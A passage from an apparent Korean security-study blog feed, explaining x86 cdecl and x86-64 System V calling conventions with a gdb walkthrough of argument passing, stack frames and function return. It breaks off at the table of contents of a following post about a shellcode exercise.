  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cdecl&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYSV&lt;/code&gt; 호출 규약이 무엇인지 알기&lt;/li&gt;
  &lt;li&gt;다음 코스의 스택 버퍼 오버플로우의 위험성 알기&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;1-calling-convention&quot;&gt;1. Calling Convention&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;함수 호출 규약: 함수의 호출 및 반환에 대한 약속&lt;/li&gt;
  &lt;li&gt;한 함수 A에서 다른 함수 B를 호출하는 경우,
    &lt;ul&gt;
      &lt;li&gt;Caller(호출자): A
        &lt;ul&gt;
          &lt;li&gt;Caller의 Stack Frame, Return Address를 저장한다.&lt;/li&gt;
          &lt;li&gt;Caller는 Callee가 요구하는 인자를 전달해 줘야 한다.&lt;/li&gt;
          &lt;li&gt;Caller는 Callee의 실행이 종료될 때의 리턴값을 전달받아야 한다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Callee(피호출자): B&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;함수 호출 규약 적용의 주체: &lt;strong&gt;컴파일러&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;그러나 컴파일러를 사용하지 않고 어셈블리 코드를 만들거나, 어셈블리 코드를 이해하려면 Calling Convention을 알아야만 한다.&lt;/p&gt;

        &lt;p&gt;→ 시스템 해킹의 기본&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;2-함수-호출-규약의-종류&quot;&gt;2. 함수 호출 규약의 종류&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;컴파일러는 지원하는 호출 규약 중 CPU 아키텍처에 가장 적합한 것을 선핵한다.
    &lt;ul&gt;
      &lt;li&gt;x86(32bit): &lt;strong&gt;스택으로 인자 전달&lt;/strong&gt;; 레지스터로 Callee의 인자를 전달하기에는 레지스터 수가 너무 적음.&lt;/li&gt;
      &lt;li&gt;x86-64(64bit): &lt;strong&gt;레지스터로 인자 전달&lt;/strong&gt;(&lt;strong&gt;적은 수&lt;/strong&gt;라면), 인자가 &lt;strong&gt;너무 많다면 스택&lt;/strong&gt; 사용. 레지스터 수가 충분한 편.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;그러나 사용하는 컴파일러의 종류가 달라질 경우, 동일 아키텍처 상에서라도 다른 호출 규약이 적용될 수 있다.
    &lt;ul&gt;
      &lt;li&gt;C언어 컴파일 시:
        &lt;ul&gt;
          &lt;li&gt;Windows-MSVC
            &lt;ul&gt;
              &lt;li&gt;x86-64에서 MSx64 calling convention 사용&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;Linux-gcc
            &lt;ul&gt;
              &lt;li&gt;x86-64에서 SYSTEM V calling convention 사용&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;대표적인 Calling Convention의 종류:
    &lt;ul&gt;
      &lt;li&gt;x86 architecture:
        &lt;ul&gt;
          &lt;li&gt;cdecl&lt;/li&gt;
          &lt;li&gt;stdcall&lt;/li&gt;
          &lt;li&gt;fastcall&lt;/li&gt;
          &lt;li&gt;thiscall&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;x86-64 architecture:
        &lt;ul&gt;
          &lt;li&gt;SYSTEM V AMD64 ABI의 Calling Convention&lt;/li&gt;
          &lt;li&gt;MS ABI의 Calling Convention&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;3-x86호출-규약-cdecl&quot;&gt;3. x86호출 규약: cdecl&lt;/h1&gt;

&lt;h2 id=&quot;들어가기-전에&quot;&gt;들어가기 전에:&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;x86아키텍처 → 적은 레지스터 → 레지스터에 여유 없음 → 스택을 통해 Caller가 Callee에게 인자 전달
    &lt;ul&gt;
      &lt;li&gt;인자 전달에 사용된 스택은 Caller가 정리한다.&lt;/li&gt;
      &lt;li&gt;스택을 통해 인자를 전달할 때, 마지막 인자부터 첫 번째 인자까지 거꾸로 스택에 push
        &lt;ul&gt;
          &lt;li&gt;당연하다; 스택은 LIFO구조로 가장 위에서부터 pop 하니까, 원하는 순서대로 인자를 전달하고 싶다면 인자를 스택에 그 역순으로 push 해줘야 컴퓨터가 정순으로 읽을 수 있다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;실습&quot;&gt;실습&lt;/h2&gt;

&lt;p&gt;cdecl calling convention을 직접 확인해 보기 위해 리눅스 환경에서 gcc를 이용해 c언어를 어셈블리 소스 파일로 컴파일해 보았다.&lt;/p&gt;

&lt;p&gt;컴파일한 코드는 단순히 Caller에서 Callee에게 1, 2를 인자로 넘겨주는 동작을 하는 코드였다.&lt;/p&gt;

&lt;p&gt;컴파일 결과로 도출된 어셈블리어는 아래와 같았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Callee 함수의 어셈블리 코드와 Caller 함수의 어셈블리 코드를 확인할 수 있었다. Caller 내부에서 Callee를 호출했으므로 해당 동작에 집중해 보자.&lt;/p&gt;

&lt;p&gt;Caller에서 Callee에게 인자를 전달할 때, 코드 상에서는 Callee(1, 2)로 전달했다. 그러나 어셈블리 코드 상에서는 arg2인 2가 먼저 push되고, arg1인 1이 나중에 push되는 것을 볼 수 있다. 즉, x86 architecture calling convention의 주요 특징인 &lt;strong&gt;‘Callee의 인자는 Caller가 스택에 역순으로 전달한다’&lt;/strong&gt;가 두드러졌다.&lt;/p&gt;

&lt;p&gt;또한 Callee를 호출하고, Callee가 리턴된 이후 돌아온 코드 플로우에서 Caller의 행동도 눈여겨볼 만하다. esp에 8을 더함으로써(스택의 크기를 메모리 주소 8만큼 줄인다) &lt;strong&gt;스택을 정리하는 행위&lt;/strong&gt;를 확인할 수 있기 때문이다. 인자를 두 개 전달했으므로 각각 int 형 4byte씩 8byte가 늘어나 있던 스택을 Callee를 호출하기 직전의 크기로 돌려놓은 것이다.&lt;/p&gt;

&lt;p&gt;스택 정리와 관련해, Callee의 행동도 확인해 두자. Callee는 스택에 아무런 조작도 가하지 않고 리턴한다. 즉, x86 architecture의 calling convention 중 &lt;strong&gt;cdecl calling convention은 Callee가 아닌 Caller가 스택을 정리한다는 점을 확인할 수 있다.&lt;/strong&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;4-x86-64-호출-규약-sysv&quot;&gt;4. x86-64 호출 규약: SYSV&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;리눅스는 SYSTEM V(SYSV) Application Binary Interface(ABI)를 기반으로 만들어졌다.
    &lt;ul&gt;
      &lt;li&gt;SYSV ABI란? &lt;a href=&quot;https://wiki.osdev.org/System_V_ABI&quot;&gt;[자세한 설명]&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;A set of specifications that detail &lt;a href=&quot;https://wiki.osdev.org/Calling_Conventions&quot;&gt;calling conventions&lt;/a&gt;, &lt;a href=&quot;https://wiki.osdev.org/Object_Files&quot;&gt;object file formats&lt;/a&gt;, &lt;a href=&quot;https://wiki.osdev.org/Executable_Formats&quot;&gt;executable file formats&lt;/a&gt;, dynamic linking semantics, and much more for systems that complies with the &lt;em&gt;X/Open Common Application Environment Specification&lt;/em&gt; and the &lt;em&gt;System V Interface Definition.&lt;/em&gt;&lt;/li&gt;
          &lt;li&gt;ELF 포맷, 링킹 방법, 함수 호출 규약 등의 내용을 가지고 있음&lt;/li&gt;
          &lt;li&gt;그 외 위에 명시된 Specification/Definition을 이용해 컴파일되는 시스템 전용 정보를 가지고 있음&lt;/li&gt;
          &lt;li&gt;
            &lt;p&gt;즉, 컴파일과 매우 밀접한 연관 → 리눅스의 바이너리 파일들은 무조건 SYSV ABI와 연관되어 있음&lt;/p&gt;

            &lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%201.jpeg&quot; alt=&quot;실제로 file 명령어를 이용해 리눅스의 바이너리 파일들의 종류(타입)을 확인해 본 결과. SYSV에 명시된 규약을 따라 컴파일된 바이너리임을 알 수 있다.&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

            &lt;p&gt;실제로 file 명령어를 이용해 리눅스의 바이너리 파일들의 종류(타입)을 확인해 본 결과. SYSV에 명시된 규약을 따라 컴파일된 바이너리임을 알 수 있다.&lt;/p&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;SYSV에서 정의된 함수 호출 규약:
    &lt;ol&gt;
      &lt;li&gt;
        &lt;p&gt;6개의 인자를 RDI, RSI, RDX, RCX, R8, R9에 순서대로 저장해 전달한다.&lt;/p&gt;

        &lt;p&gt;&lt;em&gt;64bit이므로 레지스터 수가 충분해서 웬만큼 감당 가능한 수의 인자면 레지스터에 담아 전달한댔다!&lt;/em&gt;&lt;/p&gt;

        &lt;p&gt;&lt;em&gt;즉, 더 많은 인자를 전달해야 할 때는 스택을 추가로 쓴다.&lt;/em&gt;&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;Caller에서&lt;/strong&gt; 인자 전달에 사용된 &lt;strong&gt;스택을 정리&lt;/strong&gt;한다.&lt;/li&gt;
      &lt;li&gt;함수의 반환 값은 RAX로 전달한다. 만일 syscall callee라면 해당 callee의 종류를 RAX로 지정해 call한다.&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;SYSV Calling Convention을 gdb로 자세히 알아보자.&lt;/p&gt;

&lt;h2 id=&quot;gdb로-sysv-calling-convention-알아보기&quot;&gt;GDB로 SYSV Calling Convention 알아보기&lt;/h2&gt;

&lt;h3 id=&quot;코드-컴파일&quot;&gt;코드 컴파일&lt;/h3&gt;

&lt;p&gt;아래와 같은 코드를 컴파일하여 실행해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%202.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;컴파일 옵션은 아래와 같았다.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc &lt;span class=&quot;nt&quot;&gt;-fno-asynchronous-unwind-tables&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-masm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;intel &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-fno-omit-frame-pointer&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; sysv sysv.c &lt;span class=&quot;nt&quot;&gt;-fno-pic&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-O0&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;인자-전달&quot;&gt;인자 전달&lt;/h3&gt;

&lt;p&gt;이후 sysv에 gdb를 붙여 실행하고 중단점을 caller에 설정해(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;b caller&lt;/code&gt;) 중단점까지 실행한다.(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r&lt;/code&gt;)&lt;/p&gt;

&lt;p&gt;실행 결과 아래와 같은 Context를 확인할 수 있었다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%203.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Caller는 Callee에게 전달할 인자를 거꾸로 저장한다. 혹시라도 인자를 6개 초과하여 줄 때를 대비해, 즉 스택을 사용할 때를 대비해 전달할 인자를 거꾸로 저장하는 것 같았다.(추측)&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;caller+10&amp;gt;&lt;/code&gt;~ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;caller+37&amp;gt;&lt;/code&gt; 에서는 인자를 레지스터에 저장하지만, 7번째 인자를 저장하는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;caller+8&amp;gt;&lt;/code&gt; 에서는 스택에 push하는 것을 확인할 수 있었다.&lt;/p&gt;

&lt;p&gt;이제 Callee 함수를 호출하기 전까지 실행해 보자. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;b *caller+47&lt;/code&gt; 로 중단점을 걸고 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c&lt;/code&gt; 명령어로 해당 중단점까지 실행하면 된다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%204.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;위의 REGISTER Context를 확인하면 rdi, rsi, rdx, rcx, r8, r9의 레지스터에 전달하고자 하는 인자가 들어가 있고, RSP즉 스택의 맨 꼭대기에 레지스터에 들어가지 못한 인자가 담겨 있음을 볼 수 있다.&lt;/p&gt;

&lt;p&gt;(그러고 보니, gdb pwndbg의 register context에 나열된 레지스터 중 앞에 *가 붙은 건 함수의 인자, 스택과 관련된 레지스터였구나!)&lt;/p&gt;

&lt;h3 id=&quot;반환-주소--스택-프레임-저장&quot;&gt;반환 주소 &amp;amp; 스택 프레임 저장&lt;/h3&gt;

&lt;p&gt;이제 si 명령어로 Callee의 내부로 들어가 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%205.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;무엇보다 눈에 띄는 건 STACK context에서 확인할 수 있는 스택 구조이다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;caller+52&lt;/code&gt;, 즉 Callee가 리턴한 후 이어서 수행되어야 할 인스트럭션의 주소가 스택 꼭대기에 저장되어 있는 형태.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/system-hacking-step2-2/#/&quot;&gt;이전&lt;/a&gt;에 공부했던 것처럼 Callee 함수의 스택 프레임이 생성되기 직전에 Callee가 리턴되고 코드 플로우가 이어져야 할 인스트럭션의 주소가 스택에 push된다는 것을 상기할 수 있다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Callee 함수의 prologue.
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;push rbp&lt;/code&gt; 를 통해 Caller의 rbp를 저장하고, 스택 꼭대기(rsp)의 주소를 스택 밑바닥(rbp)로 설정해 현재 함수의 스택 프레임을 만드는 모습을 볼 수 있다.&lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;이후 Callee가 리턴되면 저장되었던 Caller의 rbp를 꺼내고, 이어서 수행될 인스트럭션의 주소를 꺼내면서 Caller의 스택 프레임으로 돌아갈 수 있다.&lt;/p&gt;

        &lt;p&gt;+) rbp는 스택 프레임의 밑바닥을 가리키는 포인터이기 때문에 SFP(Stack Frame Pointer)라고도 부른다.&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%206.jpeg&quot; alt=&quot;push rbp가 수행되기 직전의 스택 상태. 아직 Caller의 rbp가 저장되지 않았다.&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

        &lt;p&gt;push rbp가 수행되기 직전의 스택 상태. 아직 Caller의 rbp가 저장되지 않았다.&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%207.jpeg&quot; alt=&quot;push rbp가 수행된 직후의 스택 상태. rsp에 현재 rbp의 값이 저장되어 있는 것을 볼 수 있다.&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

        &lt;p&gt;push rbp가 수행된 직후의 스택 상태. rsp에 현재 rbp의 값이 저장되어 있는 것을 볼 수 있다.&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;새로운-스택-프레임-할당&quot;&gt;새로운 스택 프레임 할당&lt;/h3&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;push rbp&lt;/code&gt; 다음 인스트럭션인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;push rbp, rsp&lt;/code&gt; 를 실행해 보자. 즉, rsp 값을 rbp에 넣음으로써 &lt;strong&gt;Callee를 위한 새로운 스택 프레임을 할당&lt;/strong&gt;하는 것이다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%208.jpeg&quot; alt=&quot;rsp와 rbp가 일치하는 상황인 것을 확인할 수 있다. 이렇게 새로운 스택 프레임의 기반이 완성된다!&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;rsp와 rbp가 일치하는 상황인 것을 확인할 수 있다. 이렇게 새로운 스택 프레임의 기반이 완성된다!&lt;/p&gt;

&lt;p&gt;만일 Callee에서 지역 변수를 선언했다면 스택에 지역 변수를 저장해야 하기 때문에 rsp의 값을 뺄 텐데, 지역 변수를 선언하지 않기 때문에 아래 인스트럭션에서 볼 수 있듯 rsp의 값을 빼지 않고 그대로 진행된다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%209.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;어? 그런데 이상한 점이 있다. Callee 함수를 다시 보자.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%202.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Callee 함수는 ret이라는 지역 변수를 선언한다! 그런데 Callee 함수의 인스트럭션을 보면 rsp에는 변동이 없다.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;그 이유는 gcc의 컴파일 방식 때문이었다.&lt;/strong&gt; 어떤 &lt;strong&gt;지역 변수가 오로지 반환 값을 저장하는 용도로만&lt;/strong&gt; 사용될 경우, gcc는 &lt;strong&gt;스택을 할당하지 않으며 rax를 직접 사용&lt;/strong&gt;한다는 것.&lt;/p&gt;

&lt;p&gt;효율적인 자원 사용을 위한 프로그래머들의 노력을 정말 존경하지만, 그로 인해 발생하는 이런 예외들을 보면 머리를 쥐어뜯게 된다(…)&lt;/p&gt;

&lt;h3 id=&quot;반환값-전달&quot;&gt;반환값 전달&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%2010.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Callee 함수의 전체 인스트럭션을 살펴 보자. 계속해서 주어진 인자들을 더하다가, 마지막 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;callee+79&amp;gt;&lt;/code&gt; ~ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;callee+91&amp;gt;&lt;/code&gt; 에서 &lt;strong&gt;리턴할 값을 rax에 저장하고, 함수를 마무리&lt;/strong&gt;짓고 있다. 즉, &lt;strong&gt;함수의 Epilogue를 확인&lt;/strong&gt;할 수 있다. 이제 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;callee+91&amp;gt;&lt;/code&gt;, 즉 함수를 리턴하는 인스트럭션에 중단점을 걸고 rax를 확인해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%2011.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Callee에 전달했던 7개 인자의 합을 확인할 수 있다.&lt;/p&gt;

&lt;h3 id=&quot;반환&quot;&gt;반환&lt;/h3&gt;

&lt;p&gt;반환은 저장해뒀던 Caller의 스택 프레임과 반환 인스트럭션 주소를 꺼내는 과정이다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%2012.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Callee 함수가 지역 변수를 선언하지 않았기 때문에(리턴값을 담는 변수 제외) 스택 프레임을 만들지 않았고, 따라서 단순히 pop rbp로만 스택 프레임을 꺼내고 끝나는 것을 확인할 수 있다. 그러나, 일반적인 경우-즉, 지역 변수를 선언하는 경우에는 스택 프레임이 생성되었기 때문에 leave로 스택 프레임을 꺼낸다는 점을 꼭 염두에 두자.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;td&gt;leave는 mov rsp, rbp&lt;/td&gt;
          &lt;td&gt;pop rbp 를 합쳐 둔 명령어이다.&lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
  &lt;/li&gt;
  &lt;li&gt;즉, 확보된 스택 공간을 버리고 이전 스택 프레임의 rbp 꺼내 오는 명령어이다.&lt;/li&gt;
  &lt;li&gt;이를 다시 말하면 현재 스택 프레임을 버리고 이전 스택 프레임을 꺼내는 것이다.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;스택 프레임을 꺼낸 이후에는 ret으로 Caller에게 복귀한다. 복귀할 때 변화하는 것은 앞서 설명했듯 rbp와 rip이므로 ret 인스트럭션을 수행한 직후 그 둘을 살펴보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%2013.jpeg&quot; alt=&quot;rbp가 Caller의 rbp로 바뀐 모습.&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;rbp가 Caller의 rbp로 바뀐 모습.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%2014.jpeg&quot; alt=&quot;rip가 리턴 주소로 설정되어 있는 모습.&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;rip가 리턴 주소로 설정되어 있는 모습.&lt;/p&gt;

&lt;h1 id=&quot;5-부록-함수-호출-규약&quot;&gt;5. 부록-함수 호출 규약&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;x86 함수 호출 규약&lt;/strong&gt;&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;함수호출규약&lt;/th&gt;
      &lt;th&gt;사용 컴파일러&lt;/th&gt;
      &lt;th&gt;인자 전달 방식&lt;/th&gt;
      &lt;th&gt;스택 정리&lt;/th&gt;
      &lt;th&gt;적용&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;stdcall&lt;/td&gt;
      &lt;td&gt;MSVC&lt;/td&gt;
      &lt;td&gt;Stack&lt;/td&gt;
      &lt;td&gt;Callee&lt;/td&gt;
      &lt;td&gt;WINAPI&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;cdecl&lt;/td&gt;
      &lt;td&gt;GCC, MSVC&lt;/td&gt;
      &lt;td&gt;Stack&lt;/td&gt;
      &lt;td&gt;Caller&lt;/td&gt;
      &lt;td&gt;일반 함수&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;fastcall&lt;/td&gt;
      &lt;td&gt;MSVC&lt;/td&gt;
      &lt;td&gt;ECX, EDX&lt;/td&gt;
      &lt;td&gt;Callee&lt;/td&gt;
      &lt;td&gt;최적화된 함수&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;thiscall&lt;/td&gt;
      &lt;td&gt;MSVC&lt;/td&gt;
      &lt;td&gt;ECX(인스턴스),Stack(인자)&lt;/td&gt;
      &lt;td&gt;Callee&lt;/td&gt;
      &lt;td&gt;클래스의 함수&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;strong&gt;x86-64 함수 호출 규약&lt;/strong&gt;&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;함수호출규약&lt;/th&gt;
      &lt;th&gt;사용 컴파일러&lt;/th&gt;
      &lt;th&gt;인자 전달 방식&lt;/th&gt;
      &lt;th&gt;스택 정리&lt;/th&gt;
      &lt;th&gt;적용&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;MS ABI&lt;/td&gt;
      &lt;td&gt;MSVC&lt;/td&gt;
      &lt;td&gt;RCX, RDX, R8, R9&lt;/td&gt;
      &lt;td&gt;Caller&lt;/td&gt;
      &lt;td&gt;일반 함수,Windows Syscall&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;System ABI&lt;/td&gt;
      &lt;td&gt;GCC&lt;/td&gt;
      &lt;td&gt;RDI, RSI, RDX, RCX, R8, R9, XMM0–7&lt;/td&gt;
      &lt;td&gt;Caller&lt;/td&gt;
      &lt;td&gt;일반 함수&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
</description>
        <pubDate>Fri, 12 Aug 2022 07:25:23 -0500</pubDate>
        <link>https://touBVa.github.io/blog/dreamhack_system_hacking/step5-1</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/dreamhack_system_hacking/step5-1</guid>
      </item>
    
      <item>
        <title>System Hackig Step 4-2: Shell_basic</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#stage-4-2-shell_basic&quot; id=&quot;markdown-toc-stage-4-2-shell_basic&quot;&gt;STAGE 4-2: Shell_basic&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#문제-풀이-과정-설정하기&quot; id=&quot;markdown-toc-문제-풀이-과정-설정하기&quot;&gt;문제 풀이 과정 설정하기&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#1-1-코드의-내용-확인&quot; id=&quot;markdown-toc-1-1-코드의-내용-확인&quot;&gt;1. (1) 코드의 내용 확인&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-5-익스플로잇-코드-작성&quot; id=&quot;markdown-toc-2-5-익스플로잇-코드-작성&quot;&gt;2. (5) 익스플로잇 코드 작성&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#어셈블리어로-작성하기&quot; id=&quot;markdown-toc-어셈블리어로-작성하기&quot;&gt;어셈블리어로 작성하기&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#기계어로-변환하기&quot; id=&quot;markdown-toc-기계어로-변환하기&quot;&gt;기계어로 변환하기&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#3-문제-수정&quot; id=&quot;markdown-toc-3-문제-수정&quot;&gt;3. 문제 수정&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#1-null-byte&quot; id=&quot;markdown-toc-1-null-byte&quot;&gt;#1. NULL Byte&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#2-pwntools&quot; id=&quot;markdown-toc-2-pwntools&quot;&gt;#2. Pwntools&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#4-앞으로-고칠-점&quot; id=&quot;markdown-toc-4-앞으로-고칠-점&quot;&gt;4. 앞으로 고칠 점&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;stage-4-2-shell_basic&quot;&gt;STAGE 4-2: Shell_basic&lt;/h1&gt;

&lt;ul&gt;
